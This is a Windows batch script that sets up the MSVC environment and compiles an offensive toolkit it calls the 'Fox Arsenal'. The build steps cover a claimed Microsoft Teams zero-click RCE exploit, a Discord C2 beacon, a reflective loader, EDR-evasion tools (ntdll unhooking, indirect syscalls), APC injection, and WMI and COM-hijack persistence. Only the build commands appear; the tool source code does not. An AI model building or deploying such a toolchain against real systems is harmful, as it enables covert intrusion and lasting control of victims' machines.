@echo off
setlocal

:: Set the working directory to the location of the batch file
cd /d "%~dp0"

echo [*] Starting Compilation of the Fox Arsenal...

:: Try to find vcvarsall.bat using vswhere
set "VCVARS="
if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" (
    for /f "usebackq tokens=*" %%i in (`"%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do (
        if exist "%%i\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=%%i\VC\Auxiliary\Build\vcvarsall.bat"
    )
)

:: Fallback paths if vswhere fails
if not defined VCVARS (
    if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat"
)

if defined VCVARS (
    echo [*] Initializing MSVC Environment using: %VCVARS%
    call "%VCVARS%" x64 >nul
) else (
    echo [-] Warning: Could not automatically locate vcvarsall.bat.
    echo [-] If compilation fails with 'Cannot open include file: windows.h', you MUST run this script from the "x64 Native Tools Command Prompt for VS".
)

:: Create a bin directory for the output
if not exist "bin" mkdir bin

echo [*] Compiling CVE-2025-23198 (Microsoft Teams Zero-Click RCE)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc cve_2025_23198_teams_rce.cpp /link /OUT:bin\teams_rce.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling Native Discord C2 Beacon (v2) with Ekko Sleep...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\main_beacon_v2.cpp /Tc discord_c2_v2\sleep_ekko.cpp /link /OUT:bin\beacon_v2.exe /SUBSYSTEM:WINDOWS /MACHINE:x64

echo [*] Compiling Custom Reflective Loader (sRDI)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\reflective_loader.cpp /link /OUT:bin\loader.exe /SUBSYSTEM:WINDOWS /MACHINE:x64

echo [*] Compiling Evasion (Ntdll Unhooking)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\evasion_native.cpp /link /OUT:bin\evasion.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling Indirect Syscalls (Halo's Gate)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\injection_indirect_syscalls.cpp /link /OUT:bin\syscalls.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling APC Injection...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\injection_apc.cpp /link /OUT:bin\apc_inject.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling WMI Persistence...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\persistence_wmi.cpp /link /OUT:bin\persist_wmi.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling COM Hijacking Persistence...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc discord_c2_v2\persistence_com_hijack.cpp /link /OUT:bin\persist_com.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

:: Clean up object files
del *.obj >nul 2>&1

echo [*] Compilation complete. Check the 'bin' folder.
